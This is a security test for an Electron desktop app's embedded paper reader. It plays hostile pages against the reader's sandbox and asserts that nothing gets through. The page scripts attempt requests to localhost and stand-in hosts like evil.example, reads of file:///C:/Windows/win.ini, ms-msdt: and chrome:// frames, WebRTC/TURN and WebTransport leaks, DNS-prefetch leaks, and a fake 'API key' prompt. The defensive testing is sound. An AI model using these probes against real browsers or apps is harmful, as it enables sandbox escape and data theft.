/**
 * A hostile page in the embedded reader, inside a real Electron: does the confinement hold?
 *
 *     npx electron apps/desktop/reader.electron.cjs        (npm run test:reader in apps/desktop)
 *
 * reader.test.cjs checks the rules as functions. This runs them where they matter: it starts Electron with the
 * same two calls the app makes (reader-guard.cjs), shows a page in the reader that tries everything a page could
 * to reach this computer, the local network, another site and the app itself, and looks at what got through.
 *
 * Nothing leaves this computer: every https request the reader makes that the rules let through is answered
 * here (session.protocol.handle), which is also how the test sees what was let through. The "victim" is a
 * plain http server on this computer, standing in for the app's own interface, its API and the engine: it must
 * never hear from the page. The one exception is what the test shows is left open: a name a page asks to have
 * looked up in advance (<link rel=dns-prefetch>) is asked of the system's DNS; the names used are under
 * ".invalid", which exists nowhere.
 *
 * The test's own data stays in a folder of its own, removed at the end: never the app's, nor another run's.
 *
 * Exit code 0 when everything held, 1 with the failures listed when not.
 */
const { spawnSync } = require("node:child_process");
const dgram = require("node:dgram");
const fs = require("node:fs");
const http = require("node:http");
const path = require("node:path");
const { app, BrowserWindow, session } = require("electron");
const { READER } = require("./reader.cjs");
const { holdAppWindow, readerGuard, quietNetwork } = require("./reader-guard.cjs");

const PAGE = "https://arxiv.org/abs/hostile";
const PDF = "https://arxiv.org/pdf/hostile.pdf";
/** A site on no list, which the user (the test) agrees to open in the reader: it is just as hostile. */
const OTHER = "https://other-journal.example/article";
/** A page that tries the ways out a request check may not see (prober, below). */
const PROBE = "https://arxiv.org/abs/probe";

const PROFILE = fs.mkdtempSync(path.join(require("node:os").tmpdir(), "reader-test-"));
app.setPath("userData", PROFILE);
// the app's own switches (main.cjs makes the same call)
quietNetwork(app);

/** The smallest PDF a viewer opens: one empty page. */
const A_PDF = Buffer.from(
	"%PDF-1.1\n1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj\n2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj\n" +
		"3 0 obj<</Type/Page/Parent 2 0 R/MediaBox[0 0 200 200]>>endobj\ntrailer<</Root 1 0 R>>\n%%EOF\n",
);

/** What the hostile page runs. `victim` is the port of the server on this computer it must not reach. */
function hostile(victim) {
	const attempt = `
		const told = { node: typeof require + "/" + typeof process + "/" + typeof module, tried: [] };
		const local = ["http://127.0.0.1:${victim}", "http://localhost:${victim}", "http://0.0.0.0:${victim}",
			"http://[::1]:${victim}", "http://app.localhost:${victim}", "http://127.0.0.2:${victim}",
			"https://127.0.0.1:${victim}", "http://[::ffff:127.0.0.1]:${victim}"];
		const elsewhere = ["https://evil.example", "https://evil-arxiv.org", "https://arxiv.org.evil.example",
			"https://www.google-analytics.com", "https://arxiv.org:8443", "https://192.168.1.1", "http://arxiv.org"];
		const allowed = ["https://static.arxiv.org/allowed.css", "https://cdn.jsdelivr.net/allowed.js"];
		const get = (address) => fetch(address, { mode: "no-cors" }).then(() => "sent", () => "stopped");
		const picture = (address) => new Promise((done) => {
			const image = new Image();
			image.onload = () => done("sent"); image.onerror = () => done("stopped"); image.src = address;
			setTimeout(() => done("no answer"), 1500);
		});
		const frame = (address) => new Promise((done) => {
			const inner = document.createElement("iframe");
			inner.onload = () => done("loaded"); inner.onerror = () => done("stopped"); inner.src = address;
			document.body.append(inner); setTimeout(() => done("no answer"), 1500);
		});
		const socket = (address) => new Promise((done) => {
			try {
				const ws = new WebSocket(address.replace(/^http/, "ws"));
				ws.onopen = () => done("sent"); ws.onerror = () => done("stopped");
			} catch { done("stopped"); }
			setTimeout(() => done("no answer"), 1500);
		});
		const post = (address) => new Promise((done) => {
			const inner = document.createElement("iframe"); inner.name = "sink" + Math.random();
			const form = document.createElement("form");
			form.method = "POST"; form.action = address; form.target = inner.name;
			document.body.append(inner, form); form.submit(); setTimeout(() => done("submitted"), 400);
		});
		(async () => {
			for (const base of [...local, ...elsewhere]) {
				told.tried.push([base, await get(base + "/fetch"), await picture(base + "/image.png"),
					await frame(base + "/frame"), await socket(base + "/socket"), await post(base + "/form")]);
				navigator.sendBeacon(base + "/beacon", "x");
			}
			told.file = [await get("file:///C:/Windows/win.ini"), await frame("file:///C:/Windows/win.ini")];
			told.allowed = [];
			for (const address of allowed) told.allowed.push(await get(address));
			try { told.popup = String(window.open("https://evil.example/popup")); } catch (error) { told.popup = "threw"; }
			try { told.geo = await navigator.permissions.query({ name: "geolocation" }).then((p) => p.state); } catch { told.geo = "threw"; }
			const link = document.createElement("a");
			link.href = "https://arxiv.org/download.bin"; link.download = "taken.bin"; document.body.append(link); link.click();
			await fetch("https://arxiv.org/told", { method: "POST", body: JSON.stringify(told) });
			location.href = "https://evil.example/taken-over";
		})();
	`;
	return `<!doctype html><title>hostile</title><body><script>${attempt}</script></body>`;
}

/**
 * The ways out that a check of each request may not see: hints that open connections or look names up before any
 * request, calls between browsers, WebTransport, a service worker that stays, schemes that start another program,
 * redirects from an allowed address to one that is not, and the browser's own pages.
 */
function prober(victim, udp) {
	const attempt = `
		const told = {};
		const mark = (step) => fetch("https://arxiv.org/progress?" + step).catch(() => {});
		const settle = (promise, ms = 2500) => Promise.race([promise, new Promise((done) => setTimeout(() => done("no answer"), ms))]);
		const frame = (address) => new Promise((done) => {
			const inner = document.createElement("iframe");
			inner.onload = () => { try { done("loaded:" + inner.contentWindow.location.href); } catch { done("loaded"); } };
			inner.src = address; document.body.append(inner); setTimeout(() => done("no answer"), 1500);
		});
		(async () => {
			// hints: a connection opened, or a name looked up, before any request is made
			const meta = document.createElement("meta");
			meta.httpEquiv = "x-dns-prefetch-control"; meta.content = "on"; document.head.append(meta);
			for (const [rel, href] of [["preconnect", "http://127.0.0.1:${victim}"], ["preconnect", "https://preconnect-leak.invalid"],
				["dns-prefetch", "https://dns-leak.invalid"], ["prefetch", "https://prefetch-leak.invalid/x"],
				["prerender", "https://prerender-leak.invalid/x"], ["preload", "https://preload-leak.invalid/x.js"]]) {
				const link = document.createElement("link"); link.rel = rel; link.href = href; if (rel === "preload") link.as = "script";
				document.head.append(link);
			}
			const anchor = document.createElement("a"); anchor.href = "https://anchor-leak.invalid/"; anchor.textContent = "x";
			document.body.append(anchor);
			const rules = document.createElement("script"); rules.type = "speculationrules";
			rules.textContent = JSON.stringify({ prerender: [{ source: "list", urls: ["https://speculation-leak.invalid/"] }],
				prefetch: [{ source: "list", urls: ["https://speculation-leak.invalid/p"] }] });
			document.head.append(rules);
			await mark("rtc");
			// calls between browsers: a relay over TCP and STUN over UDP on this computer
			try {
				const call = new RTCPeerConnection({ iceServers: [
					{ urls: "turn:127.0.0.1:${victim}?transport=tcp", username: "leak", credential: "leak" },
					{ urls: "stun:127.0.0.1:${udp}" }, { urls: "turn:127.0.0.1:${udp}?transport=udp", username: "leak", credential: "leak" }] });
				call.createDataChannel("out");
				const candidates = [];
				call.onicecandidate = (event) => event.candidate && candidates.push(event.candidate.candidate);
				await call.setLocalDescription();
				await settle(new Promise((done) => { call.onicegatheringstatechange = () => call.iceGatheringState === "complete" && done(); }), 4000);
				told.rtc = "candidates:" + candidates.length;
				call.close();
			} catch (error) { told.rtc = "threw: " + error.name; }
			await mark("transport");
			// WebTransport (HTTP/3 over UDP), to this computer
			try {
				const transport = new WebTransport("https://127.0.0.1:${udp}/transport");
				told.transport = await settle(transport.ready.then(() => "open", (error) => "failed: " + error.name));
			} catch (error) { told.transport = "threw: " + error.name; }
			await mark("keepalive");
			// a request the browser finishes after the page is gone, and a stream of server events
			try { fetch("http://127.0.0.1:${victim}/keepalive", { method: "POST", body: "x", keepalive: true, mode: "no-cors" }).catch(() => {}); } catch {}
			told.events = await settle(new Promise((done) => {
				const source = new EventSource("http://127.0.0.1:${victim}/events");
				source.onopen = () => done("open"); source.onerror = () => { source.close(); done("stopped"); };
			}));
			await mark("worker");
			// a service worker would stay after the page: refused, so nothing of a page acts later
			try {
				told.worker = await settle(navigator.serviceWorker.register("/sw.js").then(() => "registered", (error) => "refused: " + error.name));
			} catch (error) { told.worker = "threw: " + error.name; }
			await mark("redirects");
			// an allowed address redirecting to this computer, or to a site on no list
			const redirect = (to) => "https://arxiv.org/redirect?to=" + encodeURIComponent(to);
			told.redirects = [
				await settle(fetch(redirect("http://127.0.0.1:${victim}/redirected"), { mode: "no-cors" }).then(() => "sent", () => "stopped")),
				await settle(fetch(redirect("https://evil.example/redirected"), { mode: "no-cors" }).then(() => "sent", () => "stopped")),
				await frame(redirect("http://127.0.0.1:${victim}/redirected-frame")),
			];
			await mark("frames");
			// another program, by a scheme of its own; the browser's own pages and the PDF viewer's
			told.frames = [];
			for (const address of ["constellate-probe:hello", "ms-msdt:/id", "file:///C:/Windows/win.ini", "chrome://gpu",
				"chrome://resources/js/load_time_data.js", "chrome-extension://mhjfbmdgcfjbbpaeojofohoefgiehjai/index.html",
				"devtools://devtools/bundled/inspector.html", "view-source:https://arxiv.org/abs/probe"]) {
				told.frames.push([address, await frame(address)]);
			}
			await mark("flood");
			// asked again and again: a page cannot keep the user answering about one made-up site after another
			for (let index = 0; index < 4; index++) {
				location.href = "https://flood" + index + ".evil.example/";
				await new Promise((done) => setTimeout(done, 300));
			}
			await new Promise((done) => setTimeout(done, 1500));
			await fetch("https://arxiv.org/told", { method: "POST", body: JSON.stringify(told) });
			await mark("dialogs");
			// the app's own dialogs, opened by the page: none is shown
			const started = Date.now();
			const answer = [String(window.confirm("Constellate needs your API key"))];
			try { answer.push(String(window.prompt("API key"))); } catch (error) { answer.push("threw"); }
			alert("x");
			await fetch("https://arxiv.org/dialogs", { method: "POST", body: JSON.stringify({ answer, ms: Date.now() - started }) });
			await mark("unload");
			// a page that will not let the window close
			window.addEventListener("beforeunload", (event) => { event.preventDefault(); event.returnValue = "stay"; });
			// (about:blank is left out: a page may empty its own view, which shows nothing and reaches nothing)
			for (const address of ["data:text/html,<p>top</p>", "view-source:https://arxiv.org/", "chrome://settings",
				"devtools://devtools/bundled/inspector.html"]) {
				try { location.href = address; } catch {}
				await new Promise((done) => setTimeout(done, 300));
			}
			await fetch("https://arxiv.org/stayed", { method: "POST", body: location.href });
		})();
	`;
	return `<!doctype html><title>probe</title><body><script>${attempt}</script></body>`;
}

/** Which names were looked up or connected to, in a network log: the hints' way out. */
function namesIn(log, names) {
	return names.filter((name) => log.includes(name));
}

const wait = (ms) => new Promise((done) => setTimeout(done, ms));

/** The user clicking in a view, as Chromium is told of it. */
async function click(guest) {
	for (const type of ["mouseDown", "mouseUp"]) guest.sendInputEvent({ type, x: 10, y: 10, button: "left", clickCount: 1 });
	await wait(100);
}

/**
 * The sockets the app's processes listen on or are bound to, with their addresses (Windows: the system's own
 * tables, read by PowerShell). Null elsewhere.
 */
function socketsOf(pids) {
	if (process.platform !== "win32") return null;
	const script = [
		`$owners = @(${pids.join(",")})`,
		"Get-NetTCPConnection -State Listen -ErrorAction SilentlyContinue | Where-Object { $owners -contains $_.OwningProcess } | " +
			'ForEach-Object { "TCP " + $_.LocalAddress + " " + $_.LocalPort }',
		"Get-NetUDPEndpoint -ErrorAction SilentlyContinue | Where-Object { $owners -contains $_.OwningProcess } | " +
			'ForEach-Object { "UDP " + $_.LocalAddress + " " + $_.LocalPort }',
	].join("; ");
	const listed = spawnSync("powershell.exe", ["-NoProfile", "-NonInteractive", "-Command", script], { encoding: "utf8" });
	return listed.stdout.split(/\r?\n/).filter(Boolean);
}

/**
 * What the guard rests on for redirects, on the real network (the reader's pages are answered by a handler above,
 * which follows a redirect itself): Electron asks onBeforeRequest again for each next address of a redirect, and
 * one it is told to cancel is never asked for. A server on this computer redirects to itself under another name;
 * the second name is refused, and must hear nothing.
 */
async function redirectsOnTheNetwork() {
	const heard = [];
	const server = http.createServer((request, response) => {
		heard.push(request.url);
		if (request.url.startsWith("/redirect")) {
			response.writeHead(302, { location: `http://127.0.0.1:${server.address().port}/redirected` });
			return response.end();
		}
		response.writeHead(200, { "content-type": "text/html" });
		response.end(`<script>window.done = Promise.all([
			fetch("/redirect", { mode: "no-cors" }).then(() => "sent", () => "stopped"),
			new Promise((done) => { const image = new Image(); image.onload = () => done("sent"); image.onerror = () => done("stopped"); image.src = "/redirect?image"; }),
		]);</script>`);
	});
	await new Promise((done) => server.listen(0, "127.0.0.1", done));
	const scratch = session.fromPartition("redirects");
	const asked = [];
	scratch.webRequest.onBeforeRequest((details, answer) => {
		asked.push(details.url);
		answer({ cancel: details.url.startsWith("http://127.0.0.1") });
	});
	const window = new BrowserWindow({ show: false, webPreferences: { partition: "redirects" } });
	await window.loadURL(`http://localhost:${server.address().port}/page`);
	const results = await window.webContents.executeJavaScript("window.done");
	window.destroy();
	server.close();
	return { results, heard, checked: asked.filter((address) => address.endsWith("/redirected")).length };
}

async function main() {
	const failures = [];
	// a test that hangs has failed: say where it stood
	const stage = { now: "starting" };
	setTimeout(() => {
		console.log(
			JSON.stringify({ held: false, failures: [...failures, `no end after 4 minutes, at: ${stage.now}`], told: stage.told }, null, 1),
		);
		finish(1);
	}, 240_000).unref();
	const check = (held, what) => {
		if (!held) failures.push(what);
	};

	// the victim: anything it hears is a failure
	const heard = [];
	const victim = http.createServer((request, response) => {
		heard.push(`${request.method} ${request.url}`);
		response.end("the app's own API");
	});
	// a connection alone is already this computer reached, whether or not a request follows (a hint, a relay)
	let connections = 0;
	const connectedAt = [];
	victim.on("connection", () => {
		connections += 1;
		connectedAt.push(stage.now);
	});
	await new Promise((done) => victim.listen(0, "127.0.0.1", done));
	const port = victim.address().port;
	// and the same over UDP (STUN, a relay, WebTransport)
	const datagrams = [];
	const udp = dgram.createSocket("udp4");
	udp.on("message", (_message, from) => datagrams.push(`${from.address}:${from.port} (${stage.now})`));
	await new Promise((done) => udp.bind(0, "127.0.0.1", done));
	const udpPort = udp.address().port;

	const refused = [];
	const permissions = [];
	// the user, as the test plays them: no to the site the hostile page sends the view to, yes to one they follow
	const asked = [];
	const outside = [];
	const guard = readerGuard({
		ask: async (host) => {
			asked.push(host);
			return host === "other-journal.example" ? "reader" : "no";
		},
		openOutside: (address) => outside.push(address),
		refusedRequest: (address, as) => refused.push(`${as} ${address}`),
		refusedPermission: (permission, details) => permissions.push(`${permission} ${details?.externalURL ?? ""}`.trim()),
	});
	const reader = guard.confineSession(session);
	await guard.routed();
	// what Chromium itself makes of the reader's proxy settings: the lists directly, the rest to a proxy not there
	for (const [address, expected] of [
		["https://arxiv.org/", "DIRECT"],
		["https://static.arxiv.org/", "DIRECT"],
		["https://cdn.jsdelivr.net/", "DIRECT"],
		["https://evil.example/", "PROXY 127.0.0.1:1"],
		[`https://127.0.0.1:${port}/`, "PROXY 127.0.0.1:1"],
		["https://localhost/", "PROXY 127.0.0.1:1"],
		["https://192.168.1.1/", "PROXY 127.0.0.1:1"],
		["https://evil-arxiv.org/", "PROXY 127.0.0.1:1"],
	]) {
		const resolved = await reader.resolveProxy(address);
		check(resolved === expected, `the reader's connections to ${address} go ${resolved}, not ${expected}`);
	}
	const preconnects = [];
	reader.on("preconnect", (_event, address) => preconnects.push(address));
	const netLog = path.join(app.getPath("temp"), `reader-net-${process.pid}.json`);
	await reader.netLog.startLogging(netLog, { captureMode: "includeSensitive" });
	// every https request the rules let through ends here, and nowhere else
	const let_through = [];
	let told = null;
	let dialogs = null;
	let stayed = null;
	reader.protocol.handle("https", async (request) => {
		// A redirect answered here is followed here as well, even to an address the guard refused (the hop is
		// checked, and its answer never reaches the page); the network itself asks nothing of a refused hop
		// (redirectsOnTheNetwork, below). Such an address is not let through.
		if (refused.some((line) => line.endsWith(` ${request.url}`))) return Response.error();
		let_through.push(request.url);
		if (request.url === PAGE || request.url === OTHER) return new Response(hostile(port), { headers: { "content-type": "text/html" } });
		if (request.url === PDF) return new Response(A_PDF, { headers: { "content-type": "application/pdf" } });
		if (request.url.startsWith("https://arxiv.org/progress?")) stage.now = `probing: ${new URL(request.url).search.slice(1)}`;
		if (request.url === PROBE) return new Response(prober(port, udpPort), { headers: { "content-type": "text/html" } });
		if (request.url === "https://arxiv.org/sw.js") {
			return new Response("self.onfetch = () => {};", { headers: { "content-type": "text/javascript" } });
		}
		if (request.url.startsWith("https://arxiv.org/redirect?to=")) {
			return new Response(null, { status: 302, headers: { location: new URL(request.url).searchParams.get("to") } });
		}
		if (request.url === "https://arxiv.org/dialogs") dialogs = JSON.parse(await request.text());
		if (request.url === "https://arxiv.org/stayed") stayed = await request.text();
		if (request.url === "https://arxiv.org/told") stage.told = told = JSON.parse(await request.text());
		if (request.url.endsWith(".bin")) {
			return new Response("x", { headers: { "content-type": "application/octet-stream", "content-disposition": "attachment" } });
		}
		return new Response("ok", { headers: { "content-type": "text/plain", "access-control-allow-origin": "*" } });
	});
	let downloads = 0;
	reader.on("will-download", (_event, item) => {
		downloads += 1;
		item.once("done", (_done, state) => check(state !== "completed", `a download completed: ${item.getFilename()}`));
	});

	// The app's window, as main.cjs makes it: its page from a server on this computer (standing in for the
	// interface), holding the reader's views and, like the Paper tab, a paper's PDF in a frame of its own.
	const view = (src, partition) => `<webview src="${src}" partition="${partition}" plugins="true" style="height:300px"></webview>`;
	const host = `<!doctype html><body>${view(PAGE, READER)}${view("https://evil.example/", READER)}${view(PAGE, "other")}
		${view("http://127.0.0.1:" + port + "/embedded", READER)}${view("file:///C:/Windows/win.ini", READER)}
		<iframe id="paper" src="/paper.pdf" style="height:300px"></iframe><iframe id="link" src="/blank"></iframe></body>`;
	const home = http.createServer((request, response) => {
		if (request.url === "/paper.pdf") return response.writeHead(200, { "content-type": "application/pdf" }).end(A_PDF);
		response.writeHead(200, { "content-type": "text/html" }).end(request.url === "/" ? host : "<p>the app</p>");
	});
	await new Promise((done) => home.listen(0, "127.0.0.1", done));
	const homeUrl = `http://127.0.0.1:${home.address().port}`;
	const window = new BrowserWindow({ show: false, width: 900, height: 1600, webPreferences: { webviewTag: true, sandbox: true } });
	const windowOutside = [];
	holdAppWindow(window, homeUrl, (address) => windowOutside.push(address));
	guard.guardWindow(window);
	const attached = [];
	window.webContents.on("did-attach-webview", (_event, guest) => attached.push(guest));
	const framesStopped = [];
	window.webContents.on("will-frame-navigate", (event) => event.defaultPrevented && framesStopped.push(event.url));
	await window.loadURL(`${homeUrl}/`);

	for (let waited = 0; waited < 60_000 && told === null; waited += 250) await wait(250);
	check(told !== null, "the hostile page never finished (did it load at all?)");
	await wait(1500); // the page's last move: sending the view to another site

	check(attached.length === 1, `${attached.length} views were attached; only the one of a paper site in the reader's partition may be`);
	const guest = attached[0];
	check(heard.length === 0, `this computer was reached: ${heard.join(", ")}`);
	const known = /^https:\/\/((static\.)?arxiv\.org|cdn\.jsdelivr\.net)\//;
	const strangers = let_through.filter((address) => !known.test(address));
	check(strangers.length === 0, `requests to other sites were let through: ${strangers.join(", ")}`);
	for (const allowed of ["https://static.arxiv.org/allowed.css", "https://cdn.jsdelivr.net/allowed.js"]) {
		check(let_through.includes(allowed), `${allowed} is on the list but was stopped: paper pages would break`);
	}
	if (told) {
		check(told.node === "undefined/undefined/undefined", `the page has Node: ${told.node}`);
		check(told.geo !== "granted", "the page was granted the location");
		for (const [base, ...results] of told.tried) {
			const through = results.filter((result) => result === "sent" || result === "loaded");
			check(through.length === 0, `${base}: the page believes it got through (${results.join(", ")})`);
		}
		check(
			told.file.every((result) => result !== "sent" && result !== "loaded"),
			`a file was read: ${told.file.join(", ")}`,
		);
		check(
			told.allowed.every((result) => result === "sent"),
			`allowed hosts were stopped: ${told.allowed.join(", ")}`,
		);
	}
	check(guest?.getURL() === PAGE, `the view was sent to ${guest?.getURL()}`);
	// the page sent the view to evil.example by itself, with nobody clicking: stopped, and nobody asked
	check(asked.length === 0, `the user was asked, with no click of theirs, about: ${asked.join(", ")}`);
	check(outside.length === 0, `links were handed to the browser unasked: ${outside.join(", ")}`);
	check(BrowserWindow.getAllWindows().length === 1, "a second window was opened");

	// The app's window: its own PDF frame opens, nothing of the reader's is stopped by the window's rule, and a frame
	// of its page sent to another site (a link in a paper's PDF) is stopped there and handed to the browser.
	check(framesStopped.length === 0, `the app's window stopped its own frames: ${framesStopped.join(", ")}`);
	await window.webContents.executeJavaScript(`document.getElementById("link").src = "https://evil.example/from-a-pdf"`);
	await wait(1000);
	const link = window.webContents.mainFrame.frames.find((frame) => frame.name === "" && frame.url.includes("/blank"));
	check(framesStopped.some((stopped) => stopped === "https://evil.example/from-a-pdf"), "a frame of the app's page went to another site");
	check(link !== undefined, "the app's frame left its own address");
	check(windowOutside.join() === "https://evil.example/from-a-pdf", `handed to the browser: ${windowOutside.join(", ")}`);
	const paperFrame = window.webContents.mainFrame.frames.find((frame) => frame.url.endsWith("/paper.pdf"));
	check(paperFrame !== undefined, "the app's own PDF frame did not open");
	check(downloads <= 1, `${downloads} downloads began`);

	stage.now = "the PDF";
	// a paper's PDF still opens in the reader's built-in viewer under these rules
	const before = refused.length;
	if (guest) {
		await guest.loadURL(PDF).catch((error) => check(false, `the PDF did not load: ${error.message}`));
		await wait(2500);
		check(guest.getURL() === PDF, `after opening the PDF the view is at ${guest.getURL()}`);
	}
	const viewer = refused.slice(before);
	check(viewer.length === 0, `the PDF viewer was refused: ${viewer.join(", ")}`);

	// A site on no list that the user agrees to: it opens, in the same sandbox, and reaches no more than before.
	if (guest) {
		told = null;
		const seen = let_through.length;
		// the user clicks a link in the page: that click is what lets the view ask
		await click(guest);
		await guest.executeJavaScript(`location.href = ${JSON.stringify(OTHER)}`).catch(() => {});
		for (let waited = 0; waited < 60_000 && told === null; waited += 250) await wait(250);
		await wait(1500);
		check(asked.join() === "other-journal.example", `asked about: ${asked.join(", ")}`);
		check(told !== null, "the approved site's page never finished");
		check(heard.length === 0, `from the approved site this computer was reached: ${heard.join(", ")}`);
		const beyond = let_through
			.slice(seen)
			.filter((address) => !known.test(address) && !address.startsWith("https://other-journal.example/"));
		check(beyond.length === 0, `the approved site reached other sites: ${beyond.join(", ")}`);
		check(told?.node === "undefined/undefined/undefined", `the approved site's page has Node: ${told?.node}`);
		check(guest.getURL() === OTHER, `after the approved site's last move the view is at ${guest.getURL()}`);
		check(!asked.includes("evil.example"), "the user was asked about the site the page sent the view to by itself");
	}

	// The ways out a request check may not see.
	stage.now = "probing";
	let probed = null;
	if (guest) {
		told = null;
		const askedBefore = asked.length;
		const connectionsBefore = connections;
		await guest.loadURL(PROBE).catch(() => {});
		for (let waited = 0; waited < 60_000 && told === null; waited += 250) await wait(250);
		probed = told;
		check(probed !== null, "the probing page never finished");
		for (let waited = 0; waited < 6000 && dialogs === null; waited += 250) await wait(250);
		check(dialogs !== null, "a dialog of the page's was shown in the app (it waited for an answer)");
		check(dialogs?.answer[0] === "false", `confirm() answered ${dialogs?.answer[0]}`);
		for (let waited = 0; waited < 6000 && stayed === null; waited += 250) await wait(250);
		check(stayed === PROBE, `the page took the view to ${stayed}`);
		await wait(1000);
		check(guest.getURL() === PROBE, `after the probing page the view is at ${guest.getURL()}`);
		check(
			connections === connectionsBefore,
			`this computer was connected to ${connections - connectionsBefore} times, while: ${connectedAt.join(", ")}`,
		);
		check(heard.length === 0, `this computer was reached: ${heard.join(", ")}`);
		check(datagrams.length === 0, `this computer was sent UDP from ${datagrams.join(", ")}`);
		const flood = asked.slice(askedBefore);
		check(flood.length === 0, `a page made the question appear by itself: ${flood.join(", ")}`);
		if (probed) {
			check(probed.worker !== "registered", "a service worker was registered");
			check(probed.transport !== "open", `WebTransport: ${probed.transport}`);
			check(probed.events !== "open", "an event stream to this computer was opened");
			check(
				probed.redirects.every((result) => result !== "sent" && !String(result).startsWith("loaded:http")),
				`redirects: ${probed.redirects}`,
			);
			const strange = probed.frames.filter(([, result]) => result.startsWith("loaded:") && !result.endsWith(":about:blank"));
			check(strange.length === 0, `frames showed: ${strange.map(([address, result]) => `${address} ${result}`).join(", ")}`);
		}
		// each hop of a redirect is checked again: both were stopped by the guard, not by chance
		for (const hop of [`xhr http://127.0.0.1:${port}/redirected`, "xhr https://evil.example/redirected"]) {
			check(refused.includes(hop), `a redirect's next address was not checked: ${hop}`);
		}
		check(
			guest.session.serviceWorkers.getAllRunning && Object.keys(guest.session.serviceWorkers.getAllRunning()).length === 0,
			"a service worker runs",
		);
	}
	// After all that, nothing of the app's processes listens on or is bound to anything but loopback: no socket
	// another computer could reach, and none that makes Windows ask whether the program may use the network.
	const sockets = socketsOf(app.getAppMetrics().map((metric) => metric.pid));
	if (sockets === null) console.error("(not Windows: the app's sockets were not listed)");
	else {
		const open = sockets.filter((socket) => !/^(TCP|UDP) (127\.\d+\.\d+\.\d+|::1) /.test(socket));
		check(open.length === 0, `the app listens on or is bound to more than loopback: ${open.join(", ")}`);
	}
	// the log does show a name that was looked up (so that finding none above means something)
	await reader.resolveHost("control-lookup.invalid").catch(() => {});
	await reader.netLog.stopLogging();
	const log = fs.readFileSync(netLog, "utf8");
	fs.rmSync(netLog, { force: true });
	const looked = namesIn(log, [
		"preconnect-leak.invalid",
		"prefetch-leak.invalid",
		"prerender-leak.invalid",
		"preload-leak.invalid",
		"anchor-leak.invalid",
		"speculation-leak.invalid",
	]);
	check(looked.length === 0, `names were looked up or connected to without a request: ${looked.join(", ")}`);
	// Left open, and known: Chromium looks up the name a page gives in <link rel=dns-prefetch>, and Electron has
	// no way to stop it short of fixing, at start, every name the app may ever look up (which a site the user
	// approves while it runs could not be). The name reaches the DNS server, never a connection or a request.
	const residual = { dnsPrefetchLookedUp: log.includes("dns-leak.invalid") };
	check(log.includes("control-lookup.invalid"), "the network log shows no lookup at all: it proves nothing");

	stage.now = "redirects on the network";
	const redirects = await redirectsOnTheNetwork();
	check(
		redirects.results.every((result) => result === "stopped"),
		`a redirect's refused hop answered: ${redirects.results}`,
	);
	check(!redirects.heard.includes("/redirected"), "a redirect's refused hop was asked for on the network");
	check(redirects.checked >= 1, "a redirect's next address was never shown to onBeforeRequest");

	// a page that asks not to be left cannot keep the app's window from closing
	stage.now = "closing";
	if (guest && !guest.isDestroyed()) await guest.executeJavaScript("document.body.click()", true).catch(() => {});
	window.close();
	await wait(1500);
	check(window.isDestroyed(), "a page in the reader kept the window from closing");

	console.log(
		JSON.stringify(
			{
				held: failures.length === 0,
				failures,
				probed,
				residual,
				sockets,
				dialogs,
				permissions,
				preconnects,
				refused: refused.length,
				asked,
				let_through,
				outside,
				downloads,
				sample_refused: refused.slice(0, 12),
			},
			null,
			1,
		),
	);
	victim.close();
	home.close();
	udp.close();
	finish(failures.length === 0 ? 0 : 1);
}

/** End the test: its data folder goes (as far as the running browser lets it), then the process. */
function finish(code) {
	try {
		fs.rmSync(PROFILE, { recursive: true, force: true, maxRetries: 2 });
	} catch {
		// a file the browser still holds: the system's temporary folder is cleaned in time
	}
	app.exit(code);
}

// the test closes its window itself, and looks at what happened after
app.on("window-all-closed", () => {});
app.whenReady().then(main, (error) => {
	console.error(error);
	finish(2);
});
